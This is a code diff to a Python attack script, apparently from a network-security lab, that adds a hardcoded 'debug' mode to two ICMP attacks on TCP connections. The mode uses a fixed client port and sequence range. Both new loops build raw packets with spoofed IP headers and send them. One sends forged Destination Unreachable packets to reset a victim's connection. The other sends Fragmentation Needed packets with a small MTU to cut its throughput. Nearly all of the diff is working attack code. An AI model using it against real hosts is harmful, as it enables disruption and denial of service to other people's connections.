@@ -20,14 +20,17 @@ def get_port_scan_strategy():
     print("1. Random sampling (1000 random ports) - realistic and fast")
     print("2. Sequential scan (every 10th port) - systematic but slow")  
     print("3. Full brute force (all 32768 ports) - guaranteed but very slow")
+    print("4. Debug (known port/seq) - for debugging with hardcoded values")
     
-    choice = input("Select scanning strategy (1-3): ")
+    choice = input("Select scanning strategy (1-4): ")
     if choice == "1":
         return "random", "Random sampling"
     elif choice == "2": 
         return "sequential", "Sequential scan"
     elif choice == "3":
         return "full", "Full brute force"
+    elif choice == "4":
+        return "debug", "Debug (known port/seq)"
     else:
         return "random", "Random sampling"
 
@@ -119,11 +122,34 @@ def build_embedded_headers(client_ip, server_ip, client_port, server_port, seq):
     
     return embedded_ip + tcp_header[:8]
 
+# Add hardcoded debug values for port and sequence
+DEBUG_CLIENT_PORT = 55555
+DEBUG_SEQ_START = 123456789
+DEBUG_SEQ_RANGE = MAX_SEQ - DEBUG_SEQ_START  # Number of sequence numbers to try
+
 def icmp_connection_reset(sock, strategy="random"):
     """Send ICMP Destination Unreachable (Connection Reset) packets"""
     print(f"[ATTACKER] ICMP Connection Reset Attack Started...")
     
     attack_count = 0
+    
+    if strategy == "debug":
+        print("[ATTACKER] Using debug mode: known port and sequence range...")
+        port = DEBUG_CLIENT_PORT
+        for seq in range(DEBUG_SEQ_START, DEBUG_SEQ_START + DEBUG_SEQ_RANGE):
+            embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
+            rest_of_header = b"\x00\x00\x00\x00"
+            icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
+            ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
+            packet = ip_header + icmp_header + embedded
+            sock.sendto(packet, (CLIENT_IP, 0))
+            attack_count += 1
+            if attack_count % 100 == 0:
+                print(f"[+] Sent {attack_count} debug packets...")
+            time.sleep(0.0005)
+        print(f"[ATTACKER] Sent {attack_count} debug ICMP Reset packets")
+        print(f"[ATTACKER] Debug attack complete - if connection was active, it should be reset")
+        return
     
     if strategy == "random":
         print("[ATTACKER] Using random port sampling...")
@@ -199,6 +225,24 @@ def icmp_throughput_reduction(sock, strategy="random"):
     print(f"[ATTACKER] ICMP Throughput Reduction Attack Started...")
     
     attack_count = 0
+    
+    if strategy == "debug":
+        print("[ATTACKER] Using debug mode: known port and sequence range...")
+        port = DEBUG_CLIENT_PORT
+        for seq in range(DEBUG_SEQ_START, DEBUG_SEQ_START + DEBUG_SEQ_RANGE):
+            embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
+            mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
+            icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
+            ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
+            packet = ip_header + icmp_header + embedded
+            sock.sendto(packet, (CLIENT_IP, 0))
+            attack_count += 1
+            if attack_count % 100 == 0:
+                print(f"[+] Sent {attack_count} debug packets... (MTU={NEXT_HOP_MTU})")
+            time.sleep(0.0005)
+        print(f"[ATTACKER] Sent {attack_count} debug ICMP Fragmentation Needed packets")
+        print(f"[ATTACKER] Debug attack complete - if connection was active, throughput should be reduced")
+        return
     
     if strategy == "random":
         print("[ATTACKER] Using random port sampling...")
